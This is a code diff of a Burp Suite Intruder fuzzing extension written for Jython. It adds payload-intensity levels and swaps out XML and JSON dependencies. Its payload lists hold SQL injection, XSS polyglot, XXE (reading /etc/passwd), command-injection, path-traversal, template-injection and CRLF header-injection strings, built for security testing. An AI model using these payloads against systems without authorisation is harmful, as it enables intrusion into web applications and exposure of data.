@@ -11,26 +11,32 @@
 # to previously detected encoding scheme. 
 #
 # Requirements for Jython (to be installed in Jython's environment):
-#   - Jython 2.7.1b3+
+#   - Jython 2.7
 #   - anytree
 #   - jwt
-#   - lxml
-#   - flatten_json
 #
 # On Windows it may be a bit tricky to resolve Jython's requirements. The steps that worked
 # for author of this script are:
 #   -----------------------------------------------------------------------------
 #   cmd> java -cp jython.jar org.python.util.jython -m ensurepip
+#   cmd> java -cp jython.jar org.python.util.jython -m ensurepip --upgrade
 #   cmd> java -cp jython.jar org.python.util.jython
 #   Jython 2.7.1b3 (default:df42d5d6be04, Feb 3 2016, 03:22:46)
 #   [Java HotSpot(TM) 64-Bit Server VM (Oracle Corporation)] on  java1.8.0_144
 #   Type "help", "copyright", "credits" or "license" for more information.
-#   >>> import pip
-#   >>> pip.main(['install', 'anytree'])
-#   >>> pip.main(['install', 'pyjwt'])
-#   >>> pip.main(['install', 'lxml'])
-#   >>> pip.main(['install', 'flatten_json'])
+#   >>> try:
+#   ...     from pip import main as pipmain
+#   ... except:
+#   ...     from pip._internal import main as pipmain
+#   ...
+#   >>> pipmain(['install', '--upgrade', 'pip'])
+#   >>> pipmain(['install', 'anytree'])
+#   >>> pipmain(['install', 'pyjwt'])
 #   -----------------------------------------------------------------------------
+#
+# Notes:
+#   This program uses code coming from 'flatten_json' package, that was taken out from that 
+#   package to avoid hassle of installing yet another package.
 #
 # Mariusz B., 2018
 #
@@ -53,11 +59,12 @@ import urllib
 import random
 import anytree
 import binascii
-import flatten_json
 import xml.dom.minidom
 import xml.etree.ElementTree as ET
 
-from lxml import etree
+from xml.dom import minidom
+from xml.dom.minidom import Node
+
 from collections import Counter
 from collections import OrderedDict
 
@@ -72,6 +79,7 @@ UNIQUE_PATTERN_TO_SEARCH_FOR = 'FUZZFUZZ'
 # SOME PREDEFINED, WISELY CHOSEN FUZZ STRINGS 
 # AND OTHER TEST-CASE PATTERNS
 #
+
 
 # This list will be appended to various test-cases
 FUZZ_APPEND_LIST = (
@@ -132,7 +140,8 @@ FUZZ_APPEND_LIST = (
     "\" or \"1\"=\"1\"#",
 )
 
-# This list will fill up tested parameter and thus constitute a test-case
+# This list will fill up tested parameter and thus constitute a test-case.
+# The order of below test-cases is important.
 FUZZ_INSERT_LIST = (
     "0", 
     "1", 
@@ -152,7 +161,6 @@ FUZZ_INSERT_LIST = (
     "*()|%26'", 
     "*()|&'", 
     "*(|(mail=*))", 
-    "*)(uid=*))(|(uid=*", 
     "(*)*)", 
     "*)*", 
     "*/*", 
@@ -168,81 +176,53 @@ FUZZ_INSERT_LIST = (
     "!'",
     "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
     "!@#0%^#0##018387@#0^^**(()",
-    "\"><script>\"",
-    "\">xxx<P>yyy",
-    "\"\t\"",
-    "#",
-    "#&apos;",
-    "#'",
-    "#xA",
-    "#xA#xD",
-    "#xD",
-    "#xD#xA",
+    
     "$NULL",
     "$null",
     "%",
     "%00",
-    "%00/",
-    "%01%02%03%04%0a%0d%0aADSF",
-    "%0a",
-    "%20",
-    "%20|",
-    "%2500",
-    "%250a",
-    "%2A",
-    "%2C",
-    "%2e%2e%2f",
-    "%3C%3F",
-    "%5C",
-    "%5C/",
-    "%60",
-    "%7C",
-    "&#10;",
-    "&#10;&#13;",
-    "&#13;",
-    "&#13;&#10;",
-    "&apos;",
-    "&quot;;id&quot;",
+    
     "(')",
-    "*",
     "*&apos;",
     "*'",
     "*|",
-    "+%00",
-    "-",
-    "--",
-    "..%%35%63",
-    "..%%35c",
-    "..%25%35%63",
-    "..%255c",
-    "..%5c",
-    "..%bg%qf",
-    "..%c0%af",
-    "..%u2215",
-    "..%u2216",
-    "../",
-    "..\\",
-    "/",
-    "/%00/",
-    "/%2A",
-    "/&apos;",
-    "/'",
-    "00",
-    "0xfffffff",
-    ";",
+
     "<?",
     "?x=",
     "?x=\"",
-    "?x=>",
     "?x=|",
-    "@&apos;",
-    "@'",
-    "A",
+
     "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|",
-    "FALSE",
-    "NULL",
-    "TRUE",
-    "[&apos;]",
+
+     # Server side template injection #1
+    "${666666*1}",
+    "{666666*1}",
+
+    # Twig
+    "{{666666*1}}",
+    "{{ '" + UNIQUE_PATTERN_TO_SEARCH_FOR + "'|upper }}",
+
+    "{{666666*'1'}}",
+    "${666666*1}a{{666666}}b",
+
+    # Smarty Template: FUZZFUZZ{*comment*}FUZZFUZZ
+    UNIQUE_PATTERN_TO_SEARCH_FOR + "{*comment*}" + UNIQUE_PATTERN_TO_SEARCH_FOR,
+
+    # Mako templates: ${"FUZZFUZZ".join("FUZZFUZZ")}
+    '${"' + UNIQUE_PATTERN_TO_SEARCH_FOR + '".join("' + UNIQUE_PATTERN_TO_SEARCH_FOR + '"}}',
+
+    "'\"><img src=x onerror=alert(/666/)>",
+    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+    "';alert(0)//\\';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\">'><SCRIPT>alert(4)</SCRIPT>=&{}\");}alert(6);function xss(){//",
+    "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert(666666) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(667667)//>\\x3e",
+
+    "\x0d\x0aCC: example@gmail.com\x0d\x0aLocation: www.google.com",
+    "||cmd.exe&&id||",
+    "||id||",
+    ";id",
+
+    # -----
+    "?x=>",
     "[']",
     "\"blah",
     "\&apos;",
@@ -264,6 +244,18 @@ FUZZ_INSERT_LIST = (
     "{'}",
     "|",
     "}\"",
+
+    "*)(uid=*))(|(uid=*", 
+    "\"><script>\"",
+    "%00/",
+    "%01%02%03%04%0a%0d%0aADSF",
+    "%0a",
+    "@&apos;",
+    "@'",
+    "FALSE",
+    "NULL",
+    "TRUE",
+    "[&apos;]",
 
     'undefined',
     'undef',
@@ -297,32 +289,48 @@ FUZZ_INSERT_LIST = (
     '{"\\x00":[1]}', 
     '{"\\x00":[1,2]}', 
 
-    # Server side template injection #1
-    "${666666*1}",
-    "{666666*1}",
+    "\">xxx<P>yyy",
+    "\"\t\"",
+    "#",
+    "#&apos;",
+    "#'",
+    "#xA",
+    "#xA#xD",
+    "#xD",
+    "#xD#xA",
 
-    # Twig
-    "{{666666*1}}",
-    "{{ '" + UNIQUE_PATTERN_TO_SEARCH_FOR + "'|upper }}",
+    "%2500",
+    "%250a",
+    "%2A",
+    "%2C",
+    "%2e%2e%2f",
+    "%3C%3F",
+    "%5C",
+    "%5C/",
+    "%60",
+    "%7C",
+    "&#10;",
+    "&#10;&#13;",
+    "&#13;",
+    "&#13;&#10;",
+    "&apos;",
+    "&quot;;id&quot;",
 
-    "{{666666*'1'}}",
-    "${666666*1}a{{666666}}b",
-
-    # Smarty Template: FUZZFUZZ{*comment*}FUZZFUZZ
-    UNIQUE_PATTERN_TO_SEARCH_FOR + "{*comment*}" + UNIQUE_PATTERN_TO_SEARCH_FOR,
-
-    # Mako templates: ${"FUZZFUZZ".join("FUZZFUZZ")}
-    '${"' + UNIQUE_PATTERN_TO_SEARCH_FOR + '".join("' + UNIQUE_PATTERN_TO_SEARCH_FOR + '"}}',
-
-    "'\"><img src=x onerror=alert(/666/)>",
-    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
-    "';alert(0)//\\';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\">'><SCRIPT>alert(4)</SCRIPT>=&{}\");}alert(6);function xss(){//",
-    "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert(666666) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(667667)//>\\x3e",
-
-    "\x0d\x0aCC: example@gmail.com\x0d\x0aLocation: www.google.com",
-    "||cmd.exe&&id||",
-    "||id||",
-    ";id",
+    "..%%35%63",
+    "..%%35c",
+    "..%25%35%63",
+    "..%255c",
+    "..%5c",
+    "..%bg%qf",
+    "..%c0%af",
+    "..%u2215",
+    "..%u2216",
+    "../",
+    "..\\",
+    "/%00/",
+    "/%2A",
+    "/&apos;",
+    "0xfffffff",
 )
 
 PATH_TRAVERSAL_FILES = {
@@ -761,8 +769,9 @@ class BaseFuzzer:
         raise NotImplementedError
 
 class BasicTypeFuzzer(BaseFuzzer):
-    def __init__(self):
+    def __init__(self, intensity):
         self.mutations = []
+        self.intensity = intensity
 
     def reset(self):
         self.mutations = []
@@ -790,11 +799,12 @@ class BasicTypeFuzzer(BaseFuzzer):
                 if f in data:
                     return 'string'
 
-            if data.count('/') <= 1 and data.count('\\') <= 1: 
+            if data.count('/') <= 1 and data.count('\\') <= 1:
                 return 'string'
 
             try:
-                if base64.b64encode(base64.b64decode(data)) == data:
+                if (len(data) % 4 != 0 or data.endswith('=')) and \
+                    base64.b64encode(base64.b64decode(data)) == data:
                     # This happens to be valid base64
                     return 'string'
             except:
@@ -824,8 +834,15 @@ class BasicTypeFuzzer(BaseFuzzer):
         mutated0 = payload[:offset]
         mutated1 = payload[offset:]
 
+        # 1/2 + 1 = 1
+        # 2/2 + 1 = 2
+        # 5/2 + 1 = 3
+        # 8/2 + 1 = 5
+        # 10/2 + 1 = 6
+        numberOfMutations = self.intensity / 2 + 1
+
         # Mutations #4: Add some repeated values
-        for i in range(3):
+        for i in range(numberOfMutations):
             try:
                 chunkLen = random.randint(len(payload[offset:]), len(payload) - 1)
             except ValueError:
@@ -839,7 +856,7 @@ class BasicTypeFuzzer(BaseFuzzer):
             self.mutations.append(repeated + mutated1)
 
         # Mutations #5: Some random bit flips
-        for i in range(3):
+        for i in range(numberOfMutations):
             byte = random.randint(0, len(payload) - 1)
             bit = random.randint(0, 7)
 
@@ -869,15 +886,24 @@ class BasicTypeFuzzer(BaseFuzzer):
                 payload + i + UNIQUE_PATTERN_TO_SEARCH_FOR
             )
 
-        # Mutations #2b: Add some insert-only values
-        for i in FUZZ_INSERT_LIST:
-            mutations.append(i)
+        if self.intensity > PayloadGenerationIntensity.MINIMAL:
+            if self.intensity > PayloadGenerationIntensity.LOW:
+                # Mutations #2b: Add some insert-only values
 
-        # Mutations #3: Some predefined entries inside of a payload
-        for i in FUZZ_APPEND_LIST:
-            mutations.append(
-                mutated0 + i + mutated1 + UNIQUE_PATTERN_TO_SEARCH_FOR
-            )
+                numberOfEntriesToUse = len(FUZZ_INSERT_LIST) 
+                if self.intensity == PayloadGenerationIntensity.MEDIUM:
+                    numberOfEntriesToUse /= 3
+                if self.intensity == PayloadGenerationIntensity.HIGH:
+                    numberOfEntriesToUse /= 2
+
+                for i in FUZZ_INSERT_LIST[:numberOfEntriesToUse]:
+                    mutations.append(i)
+
+            # Mutations #3: Some predefined entries inside of a payload
+            for i in FUZZ_APPEND_LIST:
+                mutations.append(
+                    mutated0 + i + mutated1 + UNIQUE_PATTERN_TO_SEARCH_FOR
+                )
 
         self.mutations = mutations
         return mutations
@@ -945,12 +971,26 @@ class BasicTypeFuzzer(BaseFuzzer):
             'windows' : '\\',
         }
 
+        numberOfDotsToApply = 1
+        if self.intensity > PayloadGenerationIntensity.MEDIUM:
+            numberOfDotsToApply = None
+        elif self.intensity > PayloadGenerationIntensity.LOW:
+            numberOfDotsToApply = 3
+
+        totalFiles = PATH_TRAVERSAL_FILES['linux'] + PATH_TRAVERSAL_FILES['windows']
+        fuzzEvery = PayloadGenerationIntensity.fuzzEveryN(self.intensity, totalFiles) + 1
+        if self.intensity > PayloadGenerationIntensity.HIGH:
+            fuzzEvery = 1
+
         for os in ['linux', 'windows']:
             slash = slashes[os]
-            dots = dotTemplates[os]
+            dots = dotTemplates[os][:numberOfDotsToApply]
             files = PATH_TRAVERSAL_FILES[os]
+            num = 0
 
             for file in files:
+                num += 1
+                if num % fuzzEvery != 0: continue
                 for dot in dots:
                     for i in range(depth):
                         path = dot * i + slash + file
@@ -960,19 +1000,19 @@ class BasicTypeFuzzer(BaseFuzzer):
     def getMutations(self, data):
         self.genericMutations(data)
 
-        varType = self.findType(data)
+        if self.intensity > PayloadGenerationIntensity.MINIMAL:
+            varType = self.findType(data)
+            if varType == 'string':
+                print('[>] Parameter classified as BasicType "string"')
+                self.stringMutator(data)
 
-        if varType == 'string':
-            print('[>] Parameter classified as BasicType "string"')
-            self.stringMutator(data)
+            elif varType == 'integer':
+                print('[>] Parameter classified as BasicType "integer"')
+                self.integerMutator(data)
 
-        elif varType == 'integer':
-            print('[>] Parameter classified as BasicType "integer"')
-            self.integerMutator(data)
-
-        elif varType == 'path':
-            print('[>] Parameter classified as BasicType "path"')
-            self.pathMutator(data)
+            elif varType == 'path':
+                print('[>] Parameter classified as BasicType "path"')
+                self.pathMutator(data)
 
         mutations = self.mutations[:]
         ordered = OrderedDict()
@@ -983,6 +1023,10 @@ class BasicTypeFuzzer(BaseFuzzer):
         return self.mutations
 
 class JSONTypeFuzzer(BaseFuzzer):
+    def __init__(self, intensity):
+        self.mutations = []
+        self.intensity = intensity
+
     def name(self):
         return 'JSON'
 
@@ -996,12 +1040,44 @@ class JSONTypeFuzzer(BaseFuzzer):
         except ValueError:
             return False
 
+    @staticmethod
+    def _construct_key(previous_key, separator, new_key):
+        if previous_key:
+            return "{}{}{}".format(previous_key, separator, new_key)
+        else:
+            return new_key
+
+    @staticmethod
+    def flatten(nested_dict, separator="_", root_keys_to_ignore=set()):
+        flattened_dict = dict()
+
+        def _flatten(object_, key):
+            if isinstance(object_, dict):
+                for object_key in object_:
+                    if not (not key and object_key in root_keys_to_ignore):
+                        _flatten(object_[object_key], JSONTypeFuzzer._construct_key(key, separator, object_key))
+            elif isinstance(object_, list) or isinstance(object_, set):
+                for index, item in enumerate(object_):
+                    _flatten(item, JSONTypeFuzzer._construct_key(key, separator, index))
+            else:
+                flattened_dict[key] = object_
+
+        _flatten(nested_dict, None)
+        return flattened_dict 
+
     def getMutations(self, data):
         validJson = json.loads(data)
         mutations = []
-        fuzzer = BasicTypeFuzzer()
+        fuzzer = BasicTypeFuzzer(self.intensity)
 
-        for k, fuzzable in flatten_json.flatten(validJson).items():
+        flattened = JSONTypeFuzzer.flatten(validJson).items()
+        fuzzEveryN = PayloadGenerationIntensity.fuzzEveryN(self.intensity, len(flattened))
+        num = 0
+
+        for k, fuzzable in flattened:
+            num += 1
+            if num % fuzzEveryN != 0: continue
+            
             for mut in fuzzer.getMutations(fuzzable):
                 if data.count(fuzzable) == 1:
                     dataMutated = data.replace(fuzzable, mut)
@@ -1022,6 +1098,10 @@ class JSONTypeFuzzer(BaseFuzzer):
         return out.keys()
 
 class XMLTypeFuzzer(BaseFuzzer):
+    def __init__(self, intensity):
+        self.mutations = []
+        self.intensity = intensity
+
     def name(self):
         return 'XML'
 
@@ -1054,28 +1134,47 @@ class XMLTypeFuzzer(BaseFuzzer):
                 yield child, child_path
 
     @staticmethod
+    def remove_blanks(node):
+        for x in node.childNodes:
+            if x.nodeType == Node.TEXT_NODE:
+                if x.nodeValue:
+                    x.nodeValue = x.nodeValue.strip()
+            elif x.nodeType == Node.ELEMENT_NODE:
+                XMLTypeFuzzer.remove_blanks(x)
+
+    @staticmethod
     def encode(root):
         outxml = ET.tostring(root)
-        parser = etree.XMLParser(remove_blank_text = True)
-        elem = etree.XML(outxml, parser=parser)
-        return etree.tostring(elem)
+        xml = minidom.parseString(outxml)
+        XMLTypeFuzzer.remove_blanks(xml)
+        xml.normalize()
+        return xml.toprettyxml(indent = '  ')
 
     def getMutations(self, data):
         root = ET.fromstring(data.strip())
         mutations = []
-        fuzzer = BasicTypeFuzzer()
+        fuzzer = BasicTypeFuzzer(self.intensity)
 
         out = OrderedDict()
         for mut in mutations:
             out[mut] = True
 
-        for elem, path in XMLTypeFuzzer.etree_iter_path(root):
+        elementsInXml = list(XMLTypeFuzzer.etree_iter_path(root))
+        fuzzEveryN = PayloadGenerationIntensity.fuzzEveryN(self.intensity, len(elementsInXml))
+        num = 0
+
+        for (elem, path) in elementsInXml:
             elemText = elem.text
             path = path.replace('./', './/')
 
-            if not elemText: continue
+            if not elemText.strip(): continue
+            num += 1
+            if num % fuzzEveryN != 0: continue
 
             for attrName, attrValue in elem.attrib.items():
+                num += 1
+                if num % fuzzEveryN != 0: continue
+
                 attribMutations = fuzzer.getMutations(attrValue) 
                 for mut in attribMutations:
                     if data.count(attrValue) == 1:
@@ -1108,11 +1207,34 @@ class XMLTypeFuzzer(BaseFuzzer):
         return mutations
 
 
+class PayloadGenerationIntensity:
+    MINIMAL = 1
+    LOW = 2
+    MEDIUM = 5
+    HIGH = 8
+    EXTREME = 10
+
+    @staticmethod
+    def fuzzEveryN(intensity, fuzzablesNumber):
+        fuzzEvery = 0
+        if intensity == PayloadGenerationIntensity.EXTREME: fuzzEvery = 1
+        elif intensity == PayloadGenerationIntensity.HIGH: fuzzEvery = 1
+        elif intensity == PayloadGenerationIntensity.MEDIUM: fuzzEvery = 2
+        elif intensity == PayloadGenerationIntensity.LOW: fuzzEvery = 2
+        elif intensity == PayloadGenerationIntensity.MINIMAL: fuzzEvery = 3
+
+        if fuzzablesNumber < 10:
+            fuzzEvery = 1
+
+        return fuzzEvery
+
+
+
 # =============================================
 # BURP EXTENDER INTERFACE IMPLEMENTATION
 #
 
-class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
+class BurpExtender(IBurpExtender):
     def registerExtenderCallbacks(self, callbacks):
         self._callbacks = callbacks
         self._helpers = callbacks.getHelpers()
@@ -1127,16 +1249,56 @@ class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
 [+] Unique pattern applied to input-values, to look for in responses:
     "{}"
 '''.format(
-        VERSION, UNIQUE_PATTERN_TO_SEARCH_FOR
-    ))
+            VERSION, UNIQUE_PATTERN_TO_SEARCH_FOR
+        ))
 
-        callbacks.registerIntruderPayloadGeneratorFactory(self)
+        generators = (
+            MinimalIntensityPayloadGenerator(),
+            LowIntensityPayloadGenerator(),
+            MediumIntensityPayloadGenerator(),
+            HighIntensityPayloadGenerator(),
+            ExtremeIntensityPayloadGenerator()
+        )
 
+        for gen in generators:
+            gen._callbacks = callbacks
+            gen._helpers = self._helpers
+            callbacks.registerIntruderPayloadGeneratorFactory(gen)
+
+class MinimalIntensityPayloadGenerator(IIntruderPayloadGeneratorFactory):
     def getGeneratorName(self):
-        return 'Context-Aware Payload Fuzzer'
+        return 'Context-Aware Payload Fuzzer: Minimal intensity'
 
     def createNewInstance(self, attack):
-        return ContextAwareFuzzer(self, attack)
+        return ContextAwareFuzzer(self, attack, PayloadGenerationIntensity.MINIMAL)
+
+class LowIntensityPayloadGenerator(IIntruderPayloadGeneratorFactory):
+    def getGeneratorName(self):
+        return 'Context-Aware Payload Fuzzer: Low intensity'
+
+    def createNewInstance(self, attack):
+        return ContextAwareFuzzer(self, attack, PayloadGenerationIntensity.LOW)
+
+class MediumIntensityPayloadGenerator(IIntruderPayloadGeneratorFactory):
+    def getGeneratorName(self):
+        return 'Context-Aware Payload Fuzzer: Medium intensity'
+
+    def createNewInstance(self, attack):
+        return ContextAwareFuzzer(self, attack, PayloadGenerationIntensity.MEDIUM)
+
+class HighIntensityPayloadGenerator(IIntruderPayloadGeneratorFactory):
+    def getGeneratorName(self):
+        return 'Context-Aware Payload Fuzzer: High intensity'
+
+    def createNewInstance(self, attack):
+        return ContextAwareFuzzer(self, attack, PayloadGenerationIntensity.HIGH)
+
+class ExtremeIntensityPayloadGenerator(IIntruderPayloadGeneratorFactory):
+    def getGeneratorName(self):
+        return 'Context-Aware Payload Fuzzer: Extreme intensity'
+
+    def createNewInstance(self, attack):
+        return ContextAwareFuzzer(self, attack, PayloadGenerationIntensity.EXTREME)
 
 
 
@@ -1145,20 +1307,29 @@ class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
 #
 
 class ContextAwareFuzzer(IIntruderPayloadGenerator):
-    def __init__(self, extender, attack):
+    def __init__(self, extender, attack, intensity):
         self._extender = extender
         self._attack = attack
         self._helpers = extender._helpers
+
+        self.intensity = intensity
 
         self.mutations = []
         self.payloadsToGenerate = 10
         self.payloadsGenerated = 0
 
+        # BUG: TODO:
+        print('[!] XMLTypeFuzzer not available due to Jython\'s problems with SAXParser:')
+        print('\t"Caused by: java.lang.ClassNotFoundException: org.apache.xerces.parsers.SAXParser"')
+        print("[!] If you think problem is solved, refer to 'ContextAwareFuzzer.__init__' and uncomment 'XMLTypeFuzzer' in 'self.typeHandlers'.")
+        print('')
+        
         self.typeHandlers = (
-            JSONTypeFuzzer(),
+            JSONTypeFuzzer(self.intensity),            
+            #XMLTypeFuzzer(self.intensity),
 
-            # The most generic type fuzzer must be last one
-            BasicTypeFuzzer(),
+            # The most generic type fuzzer must be the last one
+            BasicTypeFuzzer(self.intensity),
         )
 
     def hasMorePayloads(self):
@@ -1168,7 +1339,13 @@ class ContextAwareFuzzer(IIntruderPayloadGenerator):
         payload = self._helpers.bytesToString(currentPayload)
 
         reencode = ReEncoder()
+        origPayload = payload
         payload = reencode.decode(payload)
+
+        if self.payloadsGenerated == 0:
+            print('[.] ReEncoder decoded value: "{}" into "{}" using chain: ({})'.format(
+                origPayload[:64], payload[:64], '->'.join(reencode.encodings)
+            ))
 
         payload = self.mutatePayload(payload)
         self.payloadsGenerated += 1
@@ -1187,8 +1364,8 @@ class ContextAwareFuzzer(IIntruderPayloadGenerator):
     def prepareMutations(self, payload):
         for typeHandler in self.typeHandlers:
             if typeHandler.check(payload):
-                print('[.] Payload "{}" will be handled by: {}'.format(
-                    payload, typeHandler.name()
+                print('\n[.] Payload "{}" will be handled by: {}'.format(
+                    payload[:100], typeHandler.name()
                 ))
                 return typeHandler.getMutations(payload)
 
@@ -1196,7 +1373,7 @@ class ContextAwareFuzzer(IIntruderPayloadGenerator):
 
     def mutatePayload(self, payload):
         if len(self.mutations) == 0:
-            print('[.] Generating mutations for: "{}"'.format(payload))
+            #print('\n[.] Generating mutations for: "{}"'.format(payload[:100]))
             
             self.mutations = self.prepareMutations(payload)
             self.payloadsToGenerate = len(self.mutations)
